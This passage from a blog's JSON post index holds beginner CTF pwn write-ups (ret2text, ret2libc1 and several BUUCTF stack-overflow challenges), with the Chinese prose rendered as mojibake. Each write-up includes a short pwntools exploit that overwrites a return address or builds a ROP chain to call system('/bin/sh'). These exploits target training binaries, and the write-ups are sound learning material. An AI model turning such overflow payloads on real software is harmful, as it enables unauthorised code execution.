sh.interactive() [â€˜aâ€™ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]ä¸ºå•¥è¿˜éœ€è¦ä¸€ä¸ª pop_ebxå‘¢ï¼Ÿå¥½åƒçœ‹åˆ°æœ‰åšå®¢è¯´æ˜¯ä¸ºäº†å †æ ˆå¹³è¡¡å…¶å®å°±æ˜¯ç”¨äº†ä¸¤ä¸ªgadgetåœ¨è°ƒç”¨getså‡½æ•°åï¼ŒæŠŠå‚æ•°buf2ç»™popæ‰ï¼Œè¿™æ ·è¿”å›åœ°å€å°±å˜æˆäº†systemï¼Œå°±ä¼šè¿”å›åˆ°system","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week2 T3","slug":"week2-T3","date":"2023-01-13T13:03:27.000Z","updated":"2024-01-31T02:34:01.184Z","comments":true,"path":"posts/af8a739b/","link":"","permalink":"http://lmarch2.github.io/posts/af8a739b/","excerpt":"T3 ret2libc1 2023-01-09WPctf-wiki åŸºç¡€rop","text":"T3 ret2libc1 2023-01-09WPctf-wiki åŸºç¡€rop 0x00 ctf-wikiä¸­çš„åŸç†è§£é‡Šret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚0x01file checksecâ€”â€”32-bitï¼Œå¼€å¯NX 0x02IDAæŸ¥çœ‹æºç ï¼Œåº”è¯¥æ˜¯getså‡½æ•°çš„æ ˆæº¢å‡ºshift+f12çœ‹åˆ°æœ‰/bin/shå­—ç¬¦ä¸²,æ‰¾åœ°å€ä¸º0x08048720å¹¶ä¸”åœ¨secureå‡½æ•°ä¸­æœ‰systemå‡½æ•°ï¼ŒåŒå‡»è¿›å»æŸ¥çœ‹å¾—åˆ° system å‡½æ•°åœ°å€ä¸º08048460 0x03gdbè°ƒè¯•æ‰¾åç§»é‡å¯èƒ½éƒ½æ˜¯ctf-wikié‡Œé¢çš„é¢˜çš„åŸå› å§è¿™é‡Œç”šè‡³è¿åç§»é‡éƒ½å’Œå‰é¢ret2textçš„ä¸€æ · 0x04æˆ‘ä»¬è¦ç›´æ¥è¿”å›æ‰§è¡Œsystem å‡½æ•°ï¼Œexpå¯ä»¥è¿™æ ·å†™ from pwn import * sh = process('./ret2libc1') binsh_addr = 0x8048720 system_addr = 0x08048460 payload = flat([b'a' * 112, system_addr,b 'b' * 4, binsh_addr]) sh.sendline(payload) sh.interactive() è¿™é‡Œçš„å››ä¸ªbæ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™é‡Œåªæ˜¯èµ·åˆ°è®©ç»“æ„åˆæ³•çš„ä½œç”¨ï¼Œå…·ä½“æ˜¯ä»€ä¹ˆä¸é‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦è°ƒç”¨systemå°±è¡Œäº†æˆ‘è¿™ä¸ªflatï¼ˆï¼‰è¿˜æŸ¥äº†å¥½ä¹…æ˜¯ä»€ä¹ˆæ„æ€â€¦â€¦å®é™…ä¸Šå°±æ˜¯æŠŠå‡ ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥åœ¨ä¸€èµ· 0x05 questionsä¹Ÿå¯ä»¥ç›´æ¥è¿”å›systemå‡½æ•°å‹å‚çš„åœ°å€0x0804860A(ä¹Ÿå°±æ˜¯ call _systemå¤„çš„åœ°å€)è€Œä¸è¿”å›å‡½æ•°çš„ plt å¤„ï¼Œä½†æ˜¯32ä½ä¸€èˆ¬è¿”å›pltå¤„åœ°å€åå…ˆè·Ÿå‡½æ•°è¿”å›åœ°å€ï¼ˆè™šæ‹Ÿçš„ï¼‰å†æ¥å‚æ•°ä¸€ä¸ªpltè¡¨å’Œgotè¡¨çš„æ•™å­¦æ–‡ç« ","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week2 T2","slug":"week2-T2","date":"2023-01-13T13:03:21.000Z","updated":"2024-01-31T02:33:54.877Z","comments":true,"path":"posts/d88d430d/","link":"","permalink":"http://lmarch2.github.io/posts/d88d430d/","excerpt":"T2 ret2text(ä¸Šé¢˜çš„å¦ä¸€ç§è§£æ³•) 2023-01-09WPç½‘ä¸Šçœ‹åˆ°å¦ä¸€ç§æš´åŠ›è§£æ³•æ„Ÿè§‰å¾ˆä¸é”™äºæ˜¯è‡ªå·±åšè¿‡äº†ä¸€é0x01ä¸0x02è·Ÿä¸Šé¢˜ç›¸åŒ","text":"T2 ret2text(ä¸Šé¢˜çš„å¦ä¸€ç§è§£æ³•) 2023-01-09WPç½‘ä¸Šçœ‹åˆ°å¦ä¸€ç§æš´åŠ›è§£æ³•æ„Ÿè§‰å¾ˆä¸é”™äºæ˜¯è‡ªå·±åšè¿‡äº†ä¸€é0x01ä¸0x02è·Ÿä¸Šé¢˜ç›¸åŒ 0x03å¤§ä½“æ€è·¯å°±æ˜¯è¾“å…¥ä¸€å †æµ‹è¯•æ•°æ®ç„¶åè°ƒè¯•çœ‹åœ¨é‚£ä¸ªè¾“å…¥ç‚¹æŠ¥é”™äº†ï¼Œè¿™ä¸ªè¾“å…¥ç‚¹å°±æ˜¯åˆšå¥½æº¢å‡ºçš„é‚£ä¸ªç‚¹ï¼Œç„¶åè®¡ç®—åç§»é‡å³å¯å…ˆç”¨cyclicç”Ÿæˆæœ‰åºå­—ç¬¦é˜Ÿåˆ—è¿è¡Œå¹¶è¾“å…¥ç”Ÿæˆçš„å­—ç¬¦ä¸²å¾—åˆ°invalid addres 0x62616164ç”¨cyclic -læŸ¥æ‰¾åç§»é‡ 0x04å†™exp from pwn import * io = process('./ret2text') success_addr = 0x0804863A payload = b'a' * 112 + p32(success_addr) io.sendline(payload) io.interactive()","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week2 T1","slug":"week2-T1","date":"2023-01-13T13:03:09.000Z","updated":"2024-01-31T02:33:45.495Z","comments":true,"path":"posts/418412b7/","link":"","permalink":"http://lmarch2.github.io/posts/418412b7/","excerpt":"T1 ret2text 2023-01-09WPctf-wikiåŸºç¡€rop","text":"T1 ret2text 2023-01-09WPctf-wikiåŸºç¡€rop 0x01file checksecâ€”â€”32-bitï¼Œ å¼€å¯NX 0x02IDAæŸ¥çœ‹ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºmainå‡½æ•°ä¸­æœ‰getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´å‘ç°è¿˜æœ‰æœ‰ä¸€ä¸ªsecureå‡½æ•°è°ƒç”¨äº†system(â€œ/bin/shâ€)åŒå‡»å­—ç¬¦ä¸²Ctrl+Xï¼Œè®°ä¸‹â€/bin/shâ€çš„åœ°å€0x0804863A0x0804863Aå°±æ˜¯éœ€è¦è¿”å›çš„åœ°å€ 0x03ç”¨gdbè°ƒè¯•åœ¨è°ƒç”¨getså‡½æ•°çš„åœ°å€å¤„0x080486AEè®¾ç½®æ–­ç‚¹r è¿è¡Œå¦‚ä¸‹å…¶ä¸­ebpä¸º0xffffcff8,espä¸º0xffffcf70,é‚£ä¹ˆsä¸º[esp+0x1c]å³0xffffcf8cï¼Œç›¸å¯¹äºebpçš„åç§»æ˜¯0x6cï¼Œç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»æ˜¯0x6c+4 0x04å†™exp from pwn import * sh = process('./ret2text') target = 0x804863a sh.sendline(b'A' * (0x6c+4) + p32(target)) sh.interactive() 0x05ç–‘é—®ï¼šæˆ‘æœ‰ä¸€ç‚¹ä¸æ˜ç™½çš„æ˜¯ä¸ºä»€ä¹ˆIDAä¸­çœ‹åˆ°çš„sç›¸å¯¹äºebpçš„åç§»æ˜¯64hï¼Œè€Œgdbè°ƒè¯•å‡ºæ¥çš„æ˜¯0x6c+4ç½‘ä¸Šçœ‹åˆ°æœ‰ä¸€ä¸ªåªç”¨IDAå°±æˆåŠŸåœ°ç®—å‡ºäº†åç§»é‡ï¼Œä½†å¯¹äºæ–‡ç« é‡Œçš„è§£é‡Šå¹¶ä¸æ˜¯å¾ˆç†è§£åªèƒ½è¯´æœ‰æ—¶å€™IDAè¿˜æ˜¯ä¸gdbçš„æœ‰å‡ºå…¥ï¼Œä¸è¿‡è¿˜æ˜¯ä»¥gdbè°ƒè¯•çš„ä¸ºå‡†","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week1 T5","slug":"week1-T5","date":"2023-01-13T13:02:53.000Z","updated":"2024-01-31T02:33:35.742Z","comments":true,"path":"posts/545c7940/","link":"","permalink":"http://lmarch2.github.io/posts/545c7940/","excerpt":"T5 pwn1_sctf_2016 2023-01-09WPBUUCTF pwnç¬¬äº”é¢˜","text":"T5 pwn1_sctf_2016 2023-01-09WPBUUCTF pwnç¬¬äº”é¢˜ 0x01file checksecâ€”â€”32-bit,å¼€å¯NX 0x02IDAä¸­shift+f12å¯ä»¥æ‰¾åˆ°æœ‰ä¸ªcat flag.txtå¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è¾“å‡ºflagæŸ¥çœ‹è°ƒç”¨å®ƒçš„å‡½æ•°å¹¶è®°ä¸‹å®ƒçš„åœ°å€0x8048F0Dç»§ç»­å¯»æ‰¾èƒ½å¤Ÿæº¢å‡ºçš„å‡½æ•°ï¼Œåœ¨mainå‡½æ•°ä¸­çš„vulnå‡½æ•°é‡Œæœ‰fget()å‡½æ•°ä½†æ˜¯fgetå‡½æ•°é™åˆ¶äº†è¾“å…¥é•¿åº¦ä¸º32ï¼Œå¥½åƒå¹¶ä¸èƒ½æ„æˆæ ˆæº¢å‡ºäºæ˜¯æˆ‘å°±è’™äº†ï¼Œfgetåé¢çš„ä¼ªä»£ç åˆä¸æ˜¯çœ‹å¾—å¾ˆæ‡‚â€¦â€¦æŸ¥äº†è®¸å¤šå¤§æ¦‚ç†è§£äº†æ˜¯åé¢çš„replaceå‡½æ•°å°†ä¸€ä¸ªå­—èŠ‚çš„iæ¢æˆäº†ä¸‰ä¸ªå­—èŠ‚çš„youè¿™æ ·ä¸€æ¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥20ä¸ªâ€˜Iâ€™ï¼Œreplaceåå°±ä¼šå˜æˆ60ä¸ªå­—èŠ‚çš„â€˜youâ€™,è¿™æ ·å°±èƒ½å¡«æ»¡é•¿åº¦ä¸º0x3Chçš„spayloadå†è¦†ç›–æ‰ebpå†åŠ ä¸Šget_flagå‡½æ•°çš„åœ°å€å°±å¯ä»¥äº†æœ€åçœ‹å¤§ä½¬åšå®¢åŠæ‡‚åŠä¸æ‡‚åœ°å†™äº†ä¸ªexpï¼ˆè¿™ç¯‡åšå®¢æ„Ÿè§‰ç®—æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼Œå®ƒç”šè‡³æ˜¯ç›´æ¥åˆ†ææ±‡ç¼–è¯­è¨€ï¼‰ 0x03exp from pwn import * p = remote('node4.buuoj.cn', 28105) flag_addre = 0x08048F0D payload = b'I'*0x14+b'aaaa'+p32(flag_addre) p.sendline(payload) p.interactive() 0x04è¿˜æ˜¯ä¸æ˜¯å¾ˆæ‡‚åˆ°åº•æ˜¯æ€ä¹ˆçœ‹å‡ºæ¥æ˜¯æŠŠiæ¢æˆyouçš„è¿˜æœ‰å°±æ˜¯è¿™ä¸ªreplaceå‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­é‚£ä¸ªv4ä»£è¡¨çš„æ˜¯ä»€ä¹ˆå¹¶æ²¡æœ‰åœ¨v4è¿™é‡Œå†™å…¥iæˆ–è€…youå‘€ï¼Œè¿™çŒœéƒ½ä¸å¥½çŒœæ˜¯æŠŠiæ¢æˆyouäº†ç›´æ¥ç‚¹è¿›å»çœ‹replaceçš„æºç å¥½åƒåˆä¸ç§‘å­¦ï¼Œæ ¹æœ¬çœ‹ä¸æ‡‚â€¦â€¦è¡¥å……ï¼šC++çš„ä¼ªä»£ç å°±æ˜¯æ¯”è¾ƒéš¾çœ‹ï¼Œä¸èƒ½åªçœ‹IDAäº†ï¼Œè¦ç»“åˆgdbè°ƒè¯•å»çŒœiæ¢æˆyouçš„æ›¿æ¢","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T4","slug":"week1-T4","date":"2023-01-13T13:02:24.000Z","updated":"2024-01-31T02:33:29.735Z","comments":true,"path":"posts/235b49d6/","link":"","permalink":"http://lmarch2.github.io/posts/235b49d6/","excerpt":"T4 ciscn_2019_n_1 2023-01-08WPBUUCTF pwnç¬¬å››é¢˜","text":"T4 ciscn_2019_n_1 2023-01-08WPBUUCTF pwnç¬¬å››é¢˜ 0x01å…ˆfileï¼Œchekcsecâ€”â€”64-bitï¼Œå¼€å¯NX 0x02IDAä¸­mainå‡½æ•°æ²¡å•¥æœ‰ç”¨çš„ï¼Œçœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªfunå‡½æ•°ç‚¹è¿›å»çœ‹å‘ç°æœ‰ä¸ªgetså‡½æ•°ï¼Œå¯èƒ½å­˜åœ¨æ ˆæº¢å‡ºï¼ŒåŒæ—¶å‘ç°if ( v2 == 11.28125 )æ—¶è°ƒç”¨systemå‡½æ•°ï¼Œæ‰€ä»¥æƒ³åˆ°è¾“å…¥æ¥ä½¿v2çš„å€¼ç­‰äº11.28125ä½†æ˜¯getsè¯»å…¥çš„æ—¶v1è€Œä¸æ˜¯v2ï¼Œæ‰€ä»¥åˆæƒ³åˆ°è®©v1æº¢å‡ºï¼Œä½¿æº¢å‡ºçš„å€¼ä¸º11.28125å¹¶è®©å®ƒæˆä¸ºv2çš„å€¼äºæ˜¯è¿›å»æŸ¥çœ‹v1v2çš„åœ°å€è®¡ç®—å¾—é•¿åº¦ä¸º44h 0x03exp from pwn import * p=remote('node4.buuoj.cn',25907) payload=b\"a\"*44+p64(0x41348000)#0x41348000æ˜¯11.28125çš„åå…­è¿›åˆ¶æ•° p.sendline(payload) p.interactive() ç›´æ¥å†™11.28125å¥½åƒæ²¡ç”¨â€¦â€¦ç½‘ä¸Šçœ‹åˆ°ä¸€ç¯‡åšå®¢æ˜¯ç›´æ¥ä»IDAä¸­æ‰¾åå…­è¿›åˆ¶æ•°çš„pwnå¾—flagè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ç›´æ¥è¦†ç›–v1v2ï¼Œè®©è¿”å›åœ°å€æŒ‡å‘è°ƒç”¨systemå‡½æ•°çš„åœ°å€0x4006BEè¿™å°±è®©æˆ‘æœ‰ä¸€äº›ç–‘æƒ‘ï¼šå°±è¿™ä¸€é¢˜æ¥è¯´ï¼Œå¼€å¯äº†NXæœ‰æ²¡æœ‰è®©é¢˜ç›®éš¾åº¦å¢åŠ å‘¢ï¼Ÿ","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T3","slug":"week1-T3","date":"2023-01-13T13:02:17.000Z","updated":"2024-01-31T02:33:22.595Z","comments":true,"path":"posts/bd3fdc75/","link":"","permalink":"http://lmarch2.github.io/posts/bd3fdc75/","excerpt":"T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwnç¬¬ä¸‰é¢˜è€ƒç‚¹ï¼šæ ˆæº¢å‡ºï¼Œä¸ä¸Šé¢˜ç±»ä¼¼","text":"T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwnç¬¬ä¸‰é¢˜è€ƒç‚¹ï¼šæ ˆæº¢å‡ºï¼Œä¸ä¸Šé¢˜ç±»ä¼¼ 0x01 checksecä¸‹è½½æ–‡ä»¶ï¼Œæ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼ˆçœ‹å¤§ä½¬åšå®¢é‡Œè¯´æŒ‰ç»éªŒè¿™ç§æƒ…å†µä¸€èˆ¬å°±æ˜¯æ ˆæº¢å‡ºäº†ï¼‰ 0x02 IDAf5åæ±‡ç¼–ï¼Œmainå‡½æ•°é‡Œæœ‰ä¸€ä¸ªgets()å‡½æ•°çœ‹åˆ°è¿”å›ä¸€ä¸ªgets()å‡½æ•°ï¼Œå¯åˆ©ç”¨æ ˆæº¢å‡ºä½†æ˜¯è¿™ä¸ªä¸¤ä¸ªå‚æ•°çš„getså‡½æ•°æ²¡æœ‰çœ‹æ‡‚â€¦â€¦é‚£ä¸ªwriteå’Œsprintfå‡½æ•°ä¹Ÿæ²¡çœ‹æ‡‚â€¦â€¦shift+f12è°ƒå‡ºstring window æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œè™½ç„¶æ²¡æœ‰/bin/shï¼Œä½†æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªcat flag.txtï¼Œåº”è¯¥å¯ä»¥åˆ©ç”¨åŒå‡»cat flag.txtè¿›å»çœ‹çœ‹ï¼ŒXä¸€ä¸‹å‘ç°æ˜¯åœ¨sub_40060Då‡½æ•°é‡Œï¼Œåæ±‡ç¼–å†çœ‹ä¸€ä¸‹å‘ç°æˆ‘ä»¬æƒ³è¦çš„systemï¼ˆï¼‰å°±åœ¨è¿™ï¼Œè‹¥èƒ½è°ƒç”¨å®ƒçš„è¯å°±èƒ½ç›´æ¥å‘½ä»¤æŠ“å–flagäº†å‘€æ¥ä¸‹æ¥å°±æ˜¯è®°ä¸‹sub_40060Då‡½æ•°çš„åœ°å€0x40060D,å¹¶å°†å…¶ä½œä¸ºæº¢å‡ºçš„è¿”å›åœ°å€ï¼ˆä¹Ÿå¯ä»¥è®°æŠŠåç§»é‡å‹å…¥å¯„å­˜å™¨é‚£æ¡æ±‡ç¼–æŒ‡ä»¤å¤„çš„åœ°å€0x40011ï¼‰åˆå› ä¸ºè¦getsçš„v5çš„å¤§å°ä¸º0x40hï¼Œæ‰€ä»¥ä¸è¿”å›åœ°å€çš„è·ç¦»æ˜¯0x40+8ï¼ˆrbpçš„é•¿åº¦ï¼‰ 0x03 expå†™å‡ºexploit from pwn import * p = remote('node4.buuoj.cn',25916) payload='a'*(0x40+8)+p64(0x400611) p.sendline(payload) p.interactive() å¾—åˆ°flag 0x04 thinkingè¿™é¢˜è·Ÿä¸Šä¸€é¢˜ä¸€æ ·ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºï¼Œéƒ½æ˜¯å°†æŸä¸ªåé—¨å‡½æ•°çš„åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€ä¸€å¼€å§‹æ²¡ååº”è¿‡æ¥cat flag.txtå¯ä»¥ç›´æ¥ç”¨ï¼Œè¿˜åœ¨é‚£æ‰¾/bin/sh,è¿˜æ˜¯å¯¹ä¿¡æ¯ä¸å¤ªæ•æ„Ÿâ€¦â€¦ä¸è¿‡å¯¹æ ˆçš„ç›¸å…³çŸ¥è¯†çš„å­¦ä¹ è¿˜æ˜¯è®©äººæ„Ÿè§‰æœ‰æ”¶è·çš„","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T2","slug":"week1-T2","date":"2023-01-13T13:01:55.000Z","updated":"2024-01-31T02:33:15.626Z","comments":true,"path":"posts/ca38ece3/","link":"","permalink":"http://lmarch2.github.io/posts/ca38ece3/","excerpt":"T2 rip 2023-01-04WPBUUCTF pwnç¬¬äºŒé¢˜è€ƒç‚¹ï¼šç®€å•çš„æ ˆæº¢å‡º","text":"T2 rip 2023-01-04WPBUUCTF pwnç¬¬äºŒé¢˜è€ƒç‚¹ï¼šç®€å•çš„æ ˆæº¢å‡º 0x01 checksecæŸ¥çœ‹ä¿æŠ¤æœºåˆ¶å•¥éƒ½æ²¡å¼€ï¼Œéå¸¸nice 0x02 IDAfileåæ˜¯64ä½ï¼Œæ‰”åˆ°IDAé‡Œæ‰“å¼€string window,å‘ç°æœ‰/bin/shï¼ŒåŒå‡»-ã€‹ç‚¹å‡»command,ctrl+Xè·³åˆ°funå‡½æ•°é‡ŒFunction windowç›´æ¥æ‰¾ä¹Ÿè¡Œâ€¦.ç›´æ¥f5å¤§æ³•mainå‡½æ•°é‡Œå¥½åƒæ²¡å•¥ç”¨çœ‹åˆ°charäº†ä¸€ä¸ªsæ•°ç»„è¿˜æœ‰getå‡½æ•°ï¼Œæ ˆæº¢å‡ºæ— ç–‘äº†funå‡½æ•°é‡Œæœ‰systemå‡½æ•°ï¼Œæƒ³åˆ°æŠŠfunå‡½æ•°çš„åœ°å€å‹è¿›æ ˆçš„return addressé‡Œä½¿funå‡½æ•°å¾—ä»¥æ‰§è¡Œäºæ˜¯æ‰¾å‡ºfunå‡½æ•°ä¸­è°ƒç”¨systemçš„åœ°å€0x40118Aæœ‰äº†åœ°å€ï¼Œç°åœ¨éœ€è¦çŸ¥é“çš„æ˜¯sçš„é•¿åº¦ï¼Œåœ¨IDAä¸­å¯ä»¥æ‰¾åˆ°è·ç¦»rbpçš„è·ç¦»æ˜¯0Fhï¼Œä¹Ÿå°±æ˜¯sçš„å†…å­˜ç©ºé—´ä¸º15å­—èŠ‚,å½“ç„¶äº†ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦8å­—èŠ‚çš„æ•°æ®å°†rbpå¡«æ»¡ï¼Œæ‰èƒ½è®©æ•°æ®æº¢è¿‡Local Variables å’Œ Callerâ€™s rspï¼Œæº¢å‡ºè¿›å…¥Return Address 0x03 expvim pwn1.py#pwn1.py from pwn import * p = remote(\"node4 .buuoj.cn\",25026) payload = b'a' * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() ä¸€å¼€å§‹æ²¡åŠ bâ€™â€™ç„¶åæŠ¥é”™TypeError: can only concatenate str (not â€œbytesâ€) to strâ€¦â€¦æ‰§è¡Œè„šæœ¬å¾—åˆ°flag 0x04 è¡¥å……ä¸€äº›çŸ¥è¯†IDAæ ˆå¸§è§†çª—è¯¦ç»†è¯´æ˜ï¼šè¿™ç¯‡æ–‡ç« è¿™ç¯‡æ–‡ç« ä¸¾äº†ä¸€ä¸ªä¾‹å­è¯¦ç»†è¯´æ˜","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T1","slug":"week1-T1","date":"2023-01-13T12:15:14.000Z","updated":"2024-01-31T02:33:10.366Z","comments":true,"path":"posts/5331bd59/","link":"","permalink":"http://lmarch2.github.io/posts/5331bd59/","excerpt":"T1 test_your_nc 2023-01-03WPBUUCTF pwnç¬¬ä¸€é¢˜","text":"T1 test_your_nc 2023-01-03WPBUUCTF pwnç¬¬ä¸€é¢˜ ä¸€ã€ç”¨checksecæ£€æµ‹æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ä¸‹è½½æ–‡ä»¶ï¼Œchecksecå¾—çŸ¥å·²å¼€å¯NXä¿æŠ¤ï¼ˆå¥‡æ€ªçš„æ˜¯checksecæ²¡æœ‰ç»™å‡ºæ–‡ä»¶ä½æ•°ï¼Œåæ¥è¿˜æ˜¯fileäº†ä¸€ä¸‹å¾—åˆ°æ˜¯64ä½ï¼‰ äºŒã€æ‰“å¼€IDAå°†æ–‡ä»¶æ‰”åˆ°IDAä¸­ï¼ŒæŒ‰ä¸‹shift+f12,æ‰“å¼€string windowï¼Œå‘ç°/bin/shåŒå‡»/bin/shï¼Œç‚¹å‡»commandï¼Œäº¤å‰å¼•ç”¨å¿«æ·é”®Xï¼Œå‘ç°åœ°å€åœ¨mainå‡½æ•°é‡ŒæŒ‰ä¸‹f5ç¡®å®šmainå‡½æ•°å°±æ˜¯ä¸€ä¸ªç®€å•åœ°è°ƒç”¨äº†/bin/shçš„systemå‡½æ•°(å…¶å®æ„Ÿè§‰å‰ä¸¤æ­¥å°±è¿™é¢˜æ¥è¯´æ²¡å¿…è¦â€¦â€¦ä½†æ˜¯çœ‹ä¸€ç¯‡åšå®¢è¯´æ‹¿åˆ°æ–‡ä»¶å…ˆchecksecä¸€ä¸‹å†IDAä¸€ä¸‹äºæ˜¯æƒ³è¯•ä¸€ä¸‹â€¦â€¦) ä¸‰ã€ç»“åˆé¢˜ç›®æç¤ºå¯çŸ¥ç›´æ¥ncï¼ˆè¿™ä¸ªåœ°æ–¹ä¸€å¼€å§‹æŠ¥é”™ï¼Œä»”ç»†ä¸€çœ‹å‘ç°ctrl cvè¿‡æ¥çš„ç«¯å£é‚£é‡Œè¿˜æœ‰ä¸€ä¸ªï¼šå¾—æŠŠå†’å·å»æ‰â€¦â€¦ï¼‰lsåˆ—å‡ºæ–‡ä»¶ç›®å½•å‘ç°flagï¼Œç”¨catï¼ˆconcatenateï¼Œå‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼‰æŠ“å–flagå¾—","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]}],"categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"},{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"},{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.io/categories/tools-and-tricks/"},{"name":"collections","slug":"collections","permalink":"http://lmarch2.github.io/categories/collections/"},{"name":"notes","slug":"notes","permalink":"http://lmarch2.github.io/categories/notes/"},{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"æ¯å­","slug":"æ¯å­","permalink":"http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"},{"name":"N1CTF","slug":"N1CTF","permalink":"http://lmarch2.github.io/tags/N1CTF/"},{"name":"DASCTF","slug":"DASCTF","permalink":"http://lmarch2.github.io/tags/DASCTF/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://lmarch2.github.io/tags/NSSCTF/"},{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.io/tags/pwn/"},{"name":"C++","slug":"C","permalink":"http://lmarch2.github.io/tags/C/"},{"name":"BUUCTF","slug":"BUUCTF"